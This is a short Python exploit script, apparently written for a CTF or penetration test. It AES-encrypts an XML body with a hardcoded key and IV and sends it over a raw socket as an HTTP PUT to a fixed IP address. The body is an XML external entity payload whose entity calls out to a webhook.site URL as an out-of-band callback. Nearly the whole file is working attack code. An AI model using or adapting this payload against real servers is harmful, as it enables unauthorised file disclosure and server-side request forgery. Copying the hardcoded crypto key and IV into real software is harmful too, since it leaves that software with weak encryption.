import socket
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
import base64 

key = '1234567890123456'    # AES 키 (16바이트)
iv = '1234567890123456'     # AES IV (16바이트)

# AES 복호화 함수 (Java에서의 EncData.decrypt 함수와 유사)
def decrypt(data):
    global key, iv
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
    return decrypted_data.decode('utf-8')

def encrypt(data):
    global key, iv
    # AES 객체 생성 (CBC 모드)
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
    # 데이터 패딩 (PKCS7 padding, AES 블록 크기에 맞춰 패딩을 추가)
    padded_data = pad(data.encode(), AES.block_size)
    # 암호화
    encrypted = cipher.encrypt(padded_data)
    # Base64 URL-safe 인코딩 (Java와 동일한 형식으로 변환)
    encoded = base64.urlsafe_b64encode(encrypted).decode('utf-8').rstrip('=')
    return encoded
# sock 함수
def sock(host, port, message):
    global key, iv
    try:
        # 서버에 소켓 연결
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, int(port)))
            
            # 메시지 보내기
            s.sendall(message.encode())
            
            # 서버로부터 응답 받기
            response = b""
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                response += chunk
            
            # 받은 응답을 복호화
            response_str = response.decode('utf-8')
            print(response_str)
            # data_to_decrypt = response_str.split("\n\n", 1)[1].strip()  # "\n\n" 이후 데이터 추출
            # decrypted_data = decrypt(data_to_decrypt.encode(), key, iv)
            
            # # JSON 파싱하여 반환
            # return json.loads(decrypted_data)

    except Exception as e:
        print(f"Error: {e}")
        return None

# 사용 예시
host = '43.203.207.195'  # 서버 IP
port = '10002'      # 서버 포트

# body = '<?xml version="1.0" encoding="UTF-8"?>\n<root>\n <data>\n  <![CDATA['
# body += ''
# body += ']]>\n </data>\n</root>'

body = '<?xml version="1.0" encoding="UTF-8"?>\n<root>\n'
body += '  <!DOCTYPE foo [\n'
body += '    <!ENTITY xxe SYSTEM "https://webhook.site/cf749bbb-b438-4db9-8570-72c44a41dbcd">\n'
body += '  ]>\n'
body += '  <data>\n'
body += '    <![CDATA[&xxe;]]>\n'
body += '  </data>\n'
body += '</root>\r\n'

enc_body = encrypt(body)

payload = 'PUT /fsalke2j9sdfcjlz/yQOIIWf3PzTrvh0NdUByunaZZCGTYA HTTP/1.1\r\nHost: 43.203.207.195\r\n'  # 서버로 보낼 메시지
payload += 'Cookie: myapp=myapp\r\n'
payload += 'Content-Type: application/xml\r\n'
payload += 'Content-Length: ' + str(len(enc_body)) + '\r\n' 
payload += 'Connection: close\r\n\r\n'
payload += enc_body


# 서버와 통신하고 응답 처리
response = sock(host, port, payload)
if response:
    print("Received data:", response)
else:
    print("No response or error occurred.")
